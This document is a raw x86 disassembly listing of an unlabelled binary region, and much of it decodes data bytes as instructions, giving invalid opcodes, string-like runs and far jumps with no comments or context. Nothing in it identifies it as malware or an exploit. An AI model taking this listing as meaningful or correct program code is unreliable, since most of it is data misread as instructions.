  421b9d:	lods   eax,DWORD PTR ds:[esi]
  421b9e:	pop    edi
  421b9f:	mov    ds:0xb36eb26f,al
  421ba4:	jle    0x421b69
  421ba6:	jns    0x421b68
  421ba8:	aas    
  421ba9:	dec    esi
  421baa:	mov    cs,WORD PTR [edi+0x30]
  421bad:	dec    esi
  421bae:	lods   al,BYTE PTR ds:[esi]
  421baf:	dec    edi
  421bb0:	cmp    eax,0x394e7e4e
  421bb5:	dec    esi
  421bb6:	lahf   
  421bb7:	dec    edi
  421bb8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bbb:	dec    esi
  421bbc:	inc    ebp
  421bbd:	dec    esi
  421bbe:	pop    esp
  421bbf:	mov    ebp,0xc26fb25f
  421bc4:	outs   dx,BYTE PTR ds:[esi]
  421bc5:	ret    
  421bc6:	jle    0x421b9b
  421bc8:	jns    0x421b9a
  421bca:	aas    
  421bcb:	dec    esi
  421bcc:	mov    cs,WORD PTR [edi+0x30]
  421bcf:	dec    esi
  421bd0:	lods   al,BYTE PTR ds:[esi]
  421bd1:	dec    edi
  421bd2:	cmp    eax,0x394f804e
  421bd7:	dec    esi
  421bd8:	lods   al,BYTE PTR ds:[esi]
  421bd9:	dec    edi
  421bda:	cmp    cl,BYTE PTR [esi+0x30]
  421bdd:	dec    esi
  421bde:	inc    esi
  421bdf:	dec    esi
  421be0:	pop    esp
  421be1:	int    0x5f
  421be3:	ret    0xd26f
  421be6:	outs   dx,BYTE PTR ds:[esi]
  421be7:	sar    DWORD PTR [esi-0x1d],cl
  421bea:	jns    0x421bcc
  421bec:	aas    
  421bed:	dec    esi
  421bee:	mov    cs,WORD PTR [edi+0x30]
  421bf1:	dec    esi
  421bf2:	lods   al,BYTE PTR ds:[esi]
  421bf3:	dec    edi
  421bf4:	cmp    eax,0x394f834e
  421bf9:	dec    esi
  421bfa:	mov    ds:0x304e3a4f,al
  421bff:	dec    esi
  421c00:	inc    esp
  421c01:	dec    esi
  421c02:	pop    esp
  421c03:	fstp   QWORD PTR [edi-0x2e]
  421c06:	outs   dx,DWORD PTR ds:[esi]
  421c07:	loop   0x421c77
  421c09:	jecxz  0x421c89
  421c0b:	repz jns 0x421bfe
  421c0e:	aas    
  421c0f:	dec    esi
  421c10:	lea    ecx,[edi+0x30]
  421c13:	dec    esi
  421c14:	lahf   
  421c15:	dec    edi
  421c16:	cmp    eax,0x3c4fa04e
  421c1b:	dec    esi
  421c1c:	xor    BYTE PTR [esi+0x3f],cl
  421c1f:	dec    esi
  421c20:	pop    esp
  421c21:	in     eax,dx
  421c22:	pop    edi
  421c23:	loop   0x421c94
  421c25:	repnz outs dx,BYTE PTR ds:[esi]
  421c27:	repz jle 0x421c2d
  421c2a:	jns    0x421c2c
  421c2c:	jle    0x421c41
  421c2e:	jns    0x421c40
  421c30:	cmp    al,0x4e
  421c32:	jg     0x421c82
  421c34:	xor    BYTE PTR [esi-0x65],cl
  421c37:	dec    edi
  421c38:	xor    cl,BYTE PTR [esi-0x80]
  421c3b:	dec    edi
  421c3c:	cmp    al,0x4e
  421c3e:	lods   eax,DWORD PTR ds:[esi]
  421c3f:	dec    edi
  421c40:	cmp    ecx,DWORD PTR [esi+0x30]
  421c43:	dec    esi
  421c44:	inc    ebp
  421c45:	dec    esi
  421c46:	pop    esp
  421c47:	or     eax,0x126f025f
  421c4c:	outs   dx,BYTE PTR ds:[esi]
  421c4d:	adc    edi,DWORD PTR [esi+0x23]
  421c50:	jns    0x421c72
  421c52:	aas    
  421c53:	dec    esi
  421c54:	add    BYTE PTR [eax],al
  421c56:	ficomp WORD PTR [edx]
  421c58:	inc    edx
  421c59:	add    dl,dl
  421c5b:	sbb    al,0x42
  421c5d:	add    dl,bl
  421c5f:	sbb    al,0x42
  421c61:	add    BYTE PTR [edx-0x11ffbde2],al
  421c67:	sbb    eax,0x1e720042
  421c6c:	inc    edx
  421c6d:	add    BYTE PTR [edx-0x41ffbde4],bh
  421c73:	sbb    al,0x42
  421c75:	add    BYTE PTR [esi+0x1e],ch
  421c78:	inc    edx
  421c79:	add    BYTE PTR [edx],ah
  421c7b:	sbb    eax,0xa90d0042
  421c80:	pushf  
  421c81:	clc    
  421c82:	ss mov edx,0x1cd6f89c
  421c88:	inc    edx
  421c89:	add    BYTE PTR [esi-0x45ffbde3],ah
  421c8f:	sbb    eax,0x1dc60042
  421c94:	inc    edx
  421c95:	add    dh,dl
  421c97:	sbb    eax,0x1d0e0042
  421c9c:	inc    edx
  421c9d:	add    dl,bl
  421c9f:	sbb    al,BYTE PTR [edx+0x0]
  421ca2:	cs sbb eax,0x1d1e0042
  421ca8:	inc    edx
  421ca9:	add    BYTE PTR [esi-0x49ffbde2],al
  421caf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cb6:	loop   0x421cd4
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esp+ebx*1],dl
  421cbc:	push   ss
  421cbd:	or     DWORD PTR [eax],0x7050d
  421cc3:	add    BYTE PTR [eax+0x0],al
  421cc6:	cmp    al,BYTE PTR [edx+0x3e]
  421cc9:	ds enter 0x4279,0x0
  421cce:	ins    DWORD PTR es:[edi],dx
  421ccf:	push   ebp
  421cd0:	inc    esp
  421cd1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421cd7:	in     eax,dx
  421cd8:	inc    BYTE PTR [edi]
  421cda:	aas    
  421cdb:	cli    
  421cdc:	mov    ds:0x421cca05,eax
  421ce1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421ce7:	xchg   esi,eax
  421ce8:	pushf  
  421ce9:	clc    
  421cea:	mov    ah,0x95
  421cec:	pushf  
  421ced:	clc    
  421cee:	mov    ebx,0xbaf89c95
  421cf3:	xchg   ebp,eax
  421cf4:	pushf  
  421cf5:	clc    
  421cf6:	mov    ecx,0xb8f89c95
  421cfb:	xchg   ebp,eax
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    edi,0xbef89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ebp,0xa6f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	jmp    0x421a:0xd26003f9
  421d15:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d19:	add    BYTE PTR [ebx+0x77],dl
  421d1c:	jbe    0x421d6e
  421d1e:	mov    dh,0x85
  421d20:	pushf  
  421d21:	clc    
  421d22:	sbb    ecx,ebp
  421d24:	push   eax
  421d25:	pop    es
  421d26:	sbb    BYTE PTR [ebx],cl
  421d28:	add    BYTE PTR [eax],al
  421d2a:	into   
  421d2b:	sbb    al,BYTE PTR [edx+0x0]
  421d2e:	sbb    ecx,DWORD PTR [ebx]
  421d30:	add    al,0xe
	...
  421d62:	ins    BYTE PTR es:[edi],dx
  421d63:	inc    eax
  421d64:	inc    edx
  421d65:	add    BYTE PTR [esi+0x66f89c85],dh
  421d6b:	add    BYTE PTR [edx+0x0],ch
  421d6e:	add    BYTE PTR [si+0x0],ah
  421d72:	push   0x64006700
  421d77:	add    BYTE PTR [esi+0x0],ah
  421d7a:	push   0x0
  421d7c:	push   0x66006400
  421d81:	add    BYTE PTR [edi+0x0],ah
  421d84:	push   0x0
  421d86:	push   0x66006700
  421d8b:	add    BYTE PTR [eax+0x0],ch
  421d8e:	add    BYTE PTR [bp+0x0],ah
  421d92:	push   0x66006700
	...
  421d9f:	add    BYTE PTR [eax],al
  421da1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421da7:	dec    edi
  421da8:	lahf   
  421da9:	dec    edi
  421daa:	mov    ds:0x9f4fa64f,al
  421daf:	dec    edi
  421db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db1:	dec    edi
  421db2:	ins    DWORD PTR es:[edi],dx
  421db3:	dec    esi
  421db4:	bound  ecx,QWORD PTR [esi+0x30]
  421db7:	dec    esi
  421db8:	add    BYTE PTR [eax],al
  421dba:	cdq    
  421dbb:	dec    edi
  421dbc:	pushf  
  421dbd:	dec    edi
  421dbe:	fwait
  421dbf:	dec    edi
  421dc0:	ins    DWORD PTR es:[edi],dx
  421dc1:	dec    esi
  421dc2:	bound  ecx,QWORD PTR [esi+0x30]
  421dc5:	dec    esi
  421dc6:	scas   eax,DWORD PTR es:[edi]
  421dc7:	dec    edi
  421dc8:	lods   eax,DWORD PTR ds:[esi]
  421dc9:	dec    edi
  421dca:	lahf   
  421dcb:	dec    edi
  421dcc:	mov    ds:0x624e6d4f,al
  421dd1:	dec    esi
  421dd2:	xor    BYTE PTR [esi+0x0],cl
  421dd5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421ddb:	dec    edi
  421ddc:	test   eax,0xa04f934f
  421de1:	dec    edi
  421de2:	fwait
  421de3:	dec    edi
  421de4:	xor    BYTE PTR [esi+0x0],cl
  421de7:	add    BYTE PTR [eax],al
  421de9:	add    BYTE PTR [eax],al
  421deb:	add    BYTE PTR [eax],al
  421ded:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421df4:	mov    WORD PTR [ebp-0x32734274],gs
  421dfa:	mov    ebp,ds
  421dfc:	mov    ebp,gs
  421dfe:	mov    ebp,?
  421e00:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e06:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e0c:	mov    WORD PTR [edx-0x74],?
  421e0f:	jae    0x421d9d
  421e11:	jo     0x421d9f
  421e13:	jno    0x421da1
  421e15:	jbe    0x421da3
  421e17:	ja     0x421da5
  421e19:	je     0x421da7
  421e1b:	jne    0x421da9
  421e1d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e24:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e2a:	lods   al,BYTE PTR ds:[esi]
  421e2b:	jge    0x421de9
  421e2d:	jge    0x421dcd
  421e2f:	(bad)  
  421e30:	jns    0x421ea5
  421e32:	mov    ecx,0x7d738cb1
  421e37:	ins    DWORD PTR es:[edi],dx
  421e38:	enter  0x9fc6,0x26
  421e3c:	jb     0x421e41
  421e3e:	test   eax,0xb956bb17
  421e43:	hlt    
  421e44:	test   al,0x37
  421e46:	test   al,0x7e
  421e48:	fnstenv [ecx-0x6a]
  421e4b:	mov    cl,0x6a
  421e4d:	push   0xffffffce
  421e4f:	or     BYTE PTR [edx],bl
  421e51:	xlat   BYTE PTR ds:[ebx]
  421e52:	out    dx,eax
  421e53:	add    eax,0x9321d7aa
  421e58:	scas   al,BYTE PTR es:[edi]
  421e59:	adc    DWORD PTR [esi],esp
  421e5b:	jge    0x421e80
  421e5d:	fidiv  WORD PTR [edi]
  421e5f:	leave  
  421e60:	hlt    
  421e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e62:	cmp    ax,0x1fc8
  421e66:	mov    dh,cl
  421e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e69:	(bad)  
  421e6a:	and    DWORD PTR [eax],ebx
  421e6c:	and    DWORD PTR [ecx-0x18],esi
  421e6f:	(bad)  [ebx+0x7]
  421e72:	cmc    
  421e73:	enter  0x301a,0x14
  421e77:	inc    eax
  421e78:	inc    edx
  421e79:	add    BYTE PTR [ecx+0x66],dh
  421e7c:	jp     0x421eec
  421e7e:	ret    0x421c
  421e81:	add    BYTE PTR [esi],ah
  421e83:	sbb    eax,0xed080042
  421e88:	adc    al,BYTE PTR [edi]
  421e8a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421e91:	ins    BYTE PTR es:[edi],dx
  421e92:	push   0x49657557
  421e97:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421e9d:	push   edi
  421e9e:	jp     0x421f1a
  421ea0:	dec    ebp
  421ea1:	push   esi
  421ea2:	arpl   WORD PTR gs:[ecx+0x45],si
  421ea6:	dec    edx
  421ea7:	dec    esi
  421ea8:	data16 ja 0x421ef9
  421eab:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ec6:	inc    ebp
  421ec7:	push   edx
  421ec8:	jb     0x421f3e
  421eca:	inc    esi
  421ecb:	je     0x421f0e
  421ecd:	inc    esi
  421ece:	jae    0x421f46
  421ed0:	dec    ebx
  421ed1:	gs dec ecx
  421ed3:	dec    ebp
  421ed4:	dec    ebp
  421ed5:	pop    edx
  421ed6:	jp     0x421f32
  421ed8:	jbe    0x421f20
  421eda:	pop    ecx
  421edb:	jo     0x421f55
  421edd:	inc    edi
  421ede:	gs ins BYTE PTR es:[edi],dx
  421ee0:	dec    esp
  421ee1:	js     0x421f4b
  421ee3:	inc    edx
  421ee4:	js     0x421f2c
  421ee6:	dec    eax
  421ee7:	inc    ebp
  421ee8:	inc    esp
  421ee9:	inc    esp
  421eea:	push   ecx
  421eeb:	dec    edx
  421eec:	ins    BYTE PTR es:[edi],dx
  421eed:	dec    ebx
  421eee:	jbe    0x421f5e
  421ef0:	pop    eax
  421ef1:	jbe    0x421f3e
  421ef3:	inc    ecx
  421ef4:	fs gs jno 0x421f65
  421ef8:	push   ebx
  421ef9:	inc    ecx
  421efa:	add    BYTE PTR [eax],al
  421efc:	inc    ebx
  421efd:	outs   dx,BYTE PTR ds:[esi]
  421efe:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f02:	push   edx
  421f03:	push   ecx
  421f04:	push   0x74000064
  421f09:	jne    0x421f80
  421f0b:	ins    DWORD PTR es:[edi],dx
  421f0c:	push   ecx
  421f0d:	push   eax
  421f0e:	jo     0x421f8a
  421f10:	addr16 jo 0x421f69
  421f13:	pop    eax
  421f14:	add    BYTE PTR [eax],al
  421f16:	push   ecx
  421f17:	pop    ecx
  421f18:	inc    ebx
  421f19:	inc    edx
  421f1a:	outs   dx,BYTE PTR ds:[esi]
  421f1b:	popa   
  421f1c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f20:	jne    0x421f90
  421f22:	dec    ebx
  421f23:	je     0x421f88
  421f25:	bound  esp,QWORD PTR [edi+0x0]
  421f28:	jns    0x421f6f
  421f2a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f2d:	dec    ecx
  421f2e:	ja     0x421f75
  421f30:	dec    eax
  421f31:	inc    ebp
  421f32:	inc    edx
  421f33:	push   ebx
  421f34:	add    BYTE PTR [eax],al
  421f36:	outs   dx,DWORD PTR ds:[esi]
  421f37:	inc    edi
  421f38:	dec    esi
  421f39:	outs   dx,DWORD PTR ds:[esi]
  421f3a:	pop    ecx
  421f3b:	inc    edi
  421f3c:	jb     0x421f85
  421f3e:	jns    0x421fb6
  421f40:	inc    ecx
  421f41:	pop    eax
  421f42:	dec    esp
  421f43:	add    BYTE PTR [eax+0x48],bh
  421f46:	bound  edx,QWORD PTR [ebx+0x43]
  421f49:	pop    eax
  421f4a:	outs   dx,DWORD PTR ds:[esi]
  421f4b:	push   0x4355
  421f50:	dec    esp
  421f51:	ins    BYTE PTR es:[edi],dx
  421f52:	inc    edx
  421f53:	push   0x76666a73
  421f58:	inc    edx
  421f59:	jo     0x421f5b
  421f5b:	add    BYTE PTR [eax],al
  421f5d:	add    BYTE PTR [edi+0x6d],ah
  421f60:	je     0x421fa9
  421f62:	ins    BYTE PTR es:[edi],dx
  421f63:	jae    0x421fcf
  421f65:	inc    esi
  421f66:	ins    DWORD PTR es:[edi],dx
  421f67:	je     0x421fbf
  421f69:	push   0x56584178
  421f6e:	push   ebx
  421f6f:	addr16 dec edx
  421f71:	jo     0x421fe5
  421f73:	js     0x421fe4
  421f75:	pop    eax
  421f76:	dec    ebx
  421f77:	push   esp
  421f78:	dec    esp
  421f79:	jns    0x421fc6
  421f7b:	js     0x421ff5
  421f7d:	outs   dx,BYTE PTR ds:[esi]
  421f7e:	pop    ecx
  421f7f:	jae    0x421fef
  421f81:	push   0x43644448
  421f86:	arpl   WORD PTR [edx+0x55],sp
  421f89:	push   0x42504e67
  421f8e:	push   ebp
  421f8f:	je     0x422006
  421f91:	addr16 dec edi
  421f93:	dec    esp
  421f94:	inc    edx
  421f95:	ins    DWORD PTR es:[edi],dx
  421f96:	inc    esi
  421f97:	inc    esi
  421f98:	inc    esi
  421f99:	arpl   WORD PTR [edx+0x47],bx
  421f9c:	push   ebp
  421f9d:	inc    ebx
  421f9e:	popa   
  421f9f:	push   edx
  421fa0:	dec    esp
  421fa1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fa8:	push   ecx
  421fa9:	push   ebx
  421faa:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fb1:	dec    edx
  421fb2:	jns    0x42201d
  421fb4:	push   edx
  421fb5:	inc    ebx
  421fb6:	jo     0x42202d
  421fb8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fbc:	fs push ebx
  421fbe:	inc    ebx
  421fbf:	push   ebp
  421fc0:	push   eax
  421fc1:	ja     0x421ffe
  421fc3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fc7:	mov    ebp,0xa53ddffb
  421fcc:	js     0x421f87
  421fce:	rcl    DWORD PTR [esi+0x49],0xd9
  421fd2:	and    dl,bh
  421fd4:	add    DWORD PTR [eax],eax
  421fd6:	arpl   WORD PTR [eax],ax
  421fd8:	add    BYTE PTR [eax],al
  421fda:	jecxz  0x422019
  421fdc:	retf   0x6e06
  421fdf:	sbb    ch,0x7b
  421fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fe3:	adc    eax,0x42782232
  421fe8:	pop    eax
  421fe9:	int3   
  421fea:	into   
  421feb:	mov    esi,0x57516a7c
  421ff0:	scas   al,BYTE PTR es:[edi]
  421ff1:	js     0x422006
  421ff3:	mov    edi,0xe1ce3f88
  421ff8:	cmp    al,0x32
  421ffa:	ins    DWORD PTR es:[edi],dx
  421ffb:	push   cs
  421ffc:	shl    BYTE PTR [esi+0x26],1
  421fff:	mov    ch,0xc5
  422001:	scas   eax,DWORD PTR es:[edi]
  422002:	mov    ah,0xd3
  422004:	cli    
  422005:	adc    DWORD PTR [ebx+0x79d8858d],0xffffffeb
  42200c:	pop    es
  42200d:	retf   
  42200e:	add    DWORD PTR [ebx-0x20],0xe
  422012:	push   esp
  422013:	mov    ch,0x9d
  422015:	mov    ch,0x9f
  422017:	(bad)  
  422018:	cld    
  422019:	dec    BYTE PTR [eax+0x5f638c65]
  42201f:	shl    edi,1
  422021:	and    eax,0xd5efad1b
  422026:	sub    eax,0x6a66f624
  42202b:	outs   dx,BYTE PTR ds:[esi]
  42202c:	stos   BYTE PTR es:[edi],al
  42202d:	retf   
  42202e:	adc    BYTE PTR [edx-0x138d2f49],dh
  422034:	clc    
  422035:	pop    esi
  422036:	jae    0x421fef
  422038:	sahf   
  422039:	pop    esi
  42203a:	out    dx,al
  42203b:	je     0x422017
  42203d:	add    BYTE PTR [eax],al
  42203f:	add    BYTE PTR [eax],al
  422041:	add    BYTE PTR [eax],ch
  422043:	mov    dl,0xa5
  422045:	push   edx
  422046:	mov    edi,0x7cfaff57
  42204b:	xlat   BYTE PTR fs:[ebx]
  42204d:	push   esi
  42204e:	inc    ebx
  42204f:	jae    0x422012
  422051:	and    eax,0x1d785
  422056:	arpl   WORD PTR [eax],ax
  422058:	add    BYTE PTR [eax],al
  42205a:	repnz inc esi
  42205c:	mov    edi,0x7afbaff4
  422061:	add    BYTE PTR [esi],0x4f
  422064:	lahf   
  422065:	dec    edi
  422066:	fidivr DWORD PTR [ecx+ebp*4-0xdc34cc9]
  42206d:	std    
  42206e:	sbb    ebp,edi
  422070:	popa   
  422071:	mov    eax,0x7ab7ca9c
  422076:	cmp    BYTE PTR [ecx+0x1196c984],dl
  42207c:	fs pop ebx
  42207e:	xchg   ebx,eax
  42207f:	pop    edx
  422080:	hlt    
  422081:	out    dx,eax
  422082:	sbb    eax,0xab217833
  422087:	sub    al,0x43
  422089:	scas   al,BYTE PTR es:[edi]
  42208a:	xor    DWORD PTR [ecx],esi
  42208c:	cmp    eax,ebp
  42208e:	sub    ebp,DWORD PTR [esi]
  422090:	mov    dh,0xf5
  422092:	aad    0xf1
  422094:	gs push ss
  422096:	ret    
  422097:	jnp    0x4220b0
  422099:	ss inc ebp
  42209b:	xchg   esp,eax
  42209c:	push   ebp
  42209d:	push   esi
  42209e:	dec    esp
  42209f:	scas   eax,DWORD PTR es:[edi]
  4220a0:	sbb    BYTE PTR [ecx+ebx*1+0x5638abec],ch
  4220a7:	and    eax,0xac0f1253
  4220ac:	push   cs
  4220ad:	fisttp WORD PTR [edi-0x5e3d13ef]
  4220b3:	cmp    al,0x2c
  4220b5:	inc    ebp
  4220b6:	ja     0x42212a
  4220b8:	loopne 0x422070
  4220ba:	loope  0x4220bc
  4220bc:	jl     0x4220be
  4220be:	add    BYTE PTR [eax],al
  4220c0:	add    BYTE PTR [eax],al
  4220c2:	mov    bl,0x55
  4220c4:	jg     0x422047
  4220c6:	jmp    FWORD PTR [ebx-0x69418801]
  4220cc:	push   0x96eff057
  4220d1:	sbb    ebp,eax
  4220d3:	xlat   BYTE PTR ds:[ebx]
  4220d4:	add    DWORD PTR [eax],eax
  4220d6:	arpl   WORD PTR [eax],ax
  4220d8:	add    BYTE PTR [eax],al
  4220da:	int    0x36
  4220dc:	inc    eax
  4220dd:	inc    edx
  4220de:	nop
  4220df:	adc    DWORD PTR [ebp-0xd8bb38c],0xebdb4f7b
  4220e9:	gs or  al,0x8c
  4220ec:	dec    edx
  4220ed:	cld    
  4220ee:	push   edx
  4220ef:	mov    edi,0x2119d81d
  4220f4:	call   FWORD PTR [ecx-0xa]
  4220f7:	sbb    al,0x22
  4220f9:	cmp    ebx,ebx
  4220fb:	shl    esp,1
  4220fd:	push   ebp
  4220fe:	aas    
  4220ff:	push   ds
  422100:	add    eax,0x5f94754a
  422105:	jl     0x4220c6
  422107:	xor    BYTE PTR [ecx+ebp*1],cl
  42210a:	test   BYTE PTR ds:0x96e95d8d,dl
  422111:	pop    DWORD PTR [eax-0x776f829]
  422117:	jbe    0x4220bf
  422119:	push   ecx
  42211a:	or     al,0x48
  42211c:	xchg   edi,eax
  42211d:	leave  
  42211e:	cmp    esp,DWORD PTR [ebx]
  422120:	adc    al,0xbe
  422122:	pop    edx
  422123:	dec    ecx
  422124:	mov    dh,BYTE PTR [ebx+eiz*8]
  422127:	mov    dh,0x74
  422129:	shl    BYTE PTR [eax],cl
  42212b:	jmp    0xa6e58d63
  422130:	out    dx,al
  422131:	pop    ebp
  422132:	and    eax,DWORD PTR [esi]
  422134:	int3   
  422135:	and    ah,BYTE PTR [edx]
  422137:	pop    ebp
  422138:	sbb    ebx,DWORD PTR ds:[ecx]
  42213b:	aad    0x6b
  42213d:	add    BYTE PTR [eax],al
  42213f:	add    BYTE PTR [eax],al
  422141:	add    BYTE PTR [eax],bh
  422143:	(bad)  
  422144:	cmp    ah,BYTE PTR [esi+edi*8]
  422147:	in     al,dx
  422148:	fimul  WORD PTR ds:[edi+0x38ac6bd5]
  42214f:	(bad)  
  422150:	fcom   DWORD PTR [ecx+0x4b]
  422153:	fadd   DWORD PTR [ecx]
  422155:	add    BYTE PTR [ebx+0x0],ah
  422158:	add    BYTE PTR [eax],al
  42215a:	aad    0x1
  42215c:	and    dh,ah
  42215e:	mov    eax,0x787b790f
  422163:	repz enter 0x26ef,0xbb
  422168:	inc    eax
  422169:	test   BYTE PTR [esi-0x9],al
  42216c:	inc    ebp
  42216d:	test   DWORD PTR [ecx+0x77],ebx
  422170:	aam    0xb
  422172:	sub    al,0x34
  422174:	pop    eax
  422175:	xchg   ebp,eax
  422176:	outs   dx,BYTE PTR ds:[esi]
  422177:	mov    al,BYTE PTR [edx+0x27]
  42217a:	or     al,0x39
  42217c:	jmp    0x25081ae5
  422181:	loope  0x42214d
  422183:	cs pop es
  422185:	jg     0x42219a
  422187:	pushf  
  422188:	retf   
  422189:	aaa    
  42218a:	adc    dl,ch
  42218c:	or     eax,0x7fee3917
  422191:	and    al,al
  422193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422194:	js     0x4221f3
  422196:	test   al,0xd
  422198:	clc    
  422199:	sub    BYTE PTR [ebp+0x2f],al
  42219c:	or     bl,BYTE PTR [esi]
  42219e:	daa    
  42219f:	push   edi
  4221a0:	xor    esi,DWORD PTR [edx+ebp*4]
  4221a3:	push   ebx
  4221a4:	cld    
  4221a5:	iret   
  4221a6:	(bad)  [esi]
  4221a8:	inc    esi
  4221a9:	push   esi
  4221aa:	jge    0x422157
  4221ac:	inc    dx
  4221ae:	pop    ebx
  4221af:	adc    eax,0xeb903366
  4221b4:	mov    edi,0x971d45e3
  4221b9:	jecxz  0x422238
  4221bb:	jmp    0x4221b1
  4221bd:	add    BYTE PTR [eax],al
  4221bf:	add    BYTE PTR [eax],al
  4221c1:	add    cl,bl
  4221c3:	mov    dh,0x66
  4221c5:	sbb    ebp,DWORD PTR [edi-0x25]
  4221c8:	std    
  4221c9:	neg    BYTE PTR [esi]
  4221cb:	sub    esp,DWORD PTR [ebx-0x23]
  4221ce:	adc    al,BYTE PTR [ecx-0x10]
  4221d1:	retf   0xd8ae
  4221d4:	add    DWORD PTR [eax],eax
  4221d6:	arpl   WORD PTR [eax],ax
  4221d8:	add    BYTE PTR [eax],al
  4221da:	dec    edi
  4221db:	fs sbb ebp,ecx
  4221de:	pop    es
  4221df:	mov    eax,0xc4a369df
  4221e4:	inc    ebx
  4221e5:	xor    ecx,ecx
  4221e7:	and    BYTE PTR [ebx+0x59],0x50
  4221eb:	jno    0x422213
  4221ed:	cdq    
  4221ee:	cmp    dl,BYTE PTR [edi]
  4221f0:	xchg   esi,eax
  4221f1:	mov    ebp,0x8e71c9d
  4221f6:	leave  
  4221f7:	(bad)
  4221fa:	dec    ebp
  4221fb:	cld    
  4221fc:	mov    bh,al
  4221fe:	add    DWORD PTR [esi],ebp
  422200:	(bad)  
  422202:	dec    eax
  422203:	cdq    
  422204:	out    dx,al
  422205:	inc    eax
  422206:	adc    al,0x2c
  422208:	xor    al,al
  42220a:	sub    esi,DWORD PTR [esi-0x77405f30]
  422210:	or     bl,dh
  422212:	(bad)  [edx]
  422214:	cmp    BYTE PTR [esi],ch
  422216:	jle    0x422282
  422218:	and    ah,BYTE PTR [edx-0x78f5ffde]
  42221e:	in     eax,dx
  42221f:	or     BYTE PTR ds:0x850d07c2,0x1c
  422226:	out    dx,eax
  422227:	mov    dh,0x71
  422229:	jne    0x4221e5
  42222b:	fsubr  QWORD PTR [ebx]
  42222d:	test   BYTE PTR [esi-0x76],dh
  422230:	mov    eax,0xfb52f526
  422235:	mov    ebp,0x4625b8af
  42223a:	add    ebp,edi
  42223c:	dec    edi
  42223d:	add    BYTE PTR [eax],al
  42223f:	add    BYTE PTR [eax],al
  422241:	add    dl,bl
  422243:	xor    dl,BYTE PTR [edi-0x20500076]
  422249:	jb     0x42224e
  42224b:	inc    ebp
  42224c:	mov    ds:0x6a66475c,eax
  422251:	sub    edx,DWORD PTR [ecx]
  422253:	fld    DWORD PTR [ecx]
  422255:	add    BYTE PTR [ebx+0x0],ah
  422258:	add    BYTE PTR [eax],al
  42225a:	in     eax,0x1d
  42225c:	xchg   edx,eax
  42225d:	addr16 add bh,al
  422260:	push   0x25174e4a
  422265:	sahf   
  422266:	mov    ebx,ecx
  422268:	sbb    DWORD PTR [edx+eax*1+0x4266344c],edx
  42226f:	or     eax,0x71dc5e26
  422274:	mov    eax,0xc53eda2
  422279:	lock xchg ebp,eax
  42227b:	inc    edi
  42227c:	mov    bl,0x42
  42227e:	mov    dl,0x97
  422280:	sbb    eax,0xcfd8ebd4
  422285:	jo     0x4222fe
  422287:	ins    DWORD PTR es:[edi],dx
  422288:	inc    ecx
  422289:	test   al,0xe4
  42228b:	push   ss
  42228c:	push   ebx
  42228d:	or     ecx,DWORD PTR [edx+eiz*2+0x6779cfec]
  422294:	xchg   ebp,esp
  422296:	or     DWORD PTR [esp+eiz*2-0x3a],esi
  42229a:	xor    BYTE PTR [esi+0x26c4d1f4],bh
  4222a0:	imul   edi,ebp,0xfffffffd
  4222a3:	bound  edx,QWORD PTR [edi+0x4ed9450e]
  4222a9:	inc    ecx
  4222aa:	or     eax,0x37945575
  4222af:	add    al,0x8e
  4222b1:	push   0x814f59ae
  4222b6:	adc    al,0xa2
  4222b8:	xor    edx,DWORD PTR [ebx+0x2b9588]
  4222be:	add    BYTE PTR [eax],al
  4222c0:	add    BYTE PTR [eax],al
  4222c2:	dec    eax
  4222c3:	in     al,0x3
  4222c5:	fwait
  4222c6:	scas   eax,DWORD PTR es:[edi]
  4222c7:	(bad)  
  4222c8:	fdiv   st,st(7)
  4222ca:	pop    esi
  4222cb:	sub    BYTE PTR [eax-0x149ff771],bl
  4222d1:	jb     0x422347
  4222d3:	fld    DWORD PTR [ecx]
  4222d5:	add    BYTE PTR [ebx+0x0],ah
  4222d8:	add    BYTE PTR [eax],al
  4222da:	push   edx
  4222db:	fmul   DWORD PTR [esi+0x539cc850]
  4222e1:	lods   eax,DWORD PTR ds:[esi]
  4222e2:	ror    BYTE PTR [ecx],cl
  4222e4:	js     0x4222c9
  4222e6:	aad    0xe6
  4222e8:	mov    eax,ds:0x99a02ac4
  4222ed:	mov    edx,0xcc270563
  4222f2:	call   0xc7c3:0xc834864a
  4222f9:	int3   
  4222fa:	mov    eax,0x1bdab684
  4222ff:	add    ebx,eax
  422301:	aas    
  422302:	cmp    ah,ah
  422304:	mov    ah,0x10
  422306:	push   edx
  422307:	mov    al,0x6d
  422309:	jmp    0x71bf:0xe96dadf9
  422310:	pushf  
  422311:	jg     0x422348
  422313:	mov    dh,0xa
  422315:	sbb    al,0xd5
  422317:	fcom   DWORD PTR [edx-0x51]
  42231a:	cmc    
  42231b:	mov    cl,0xca
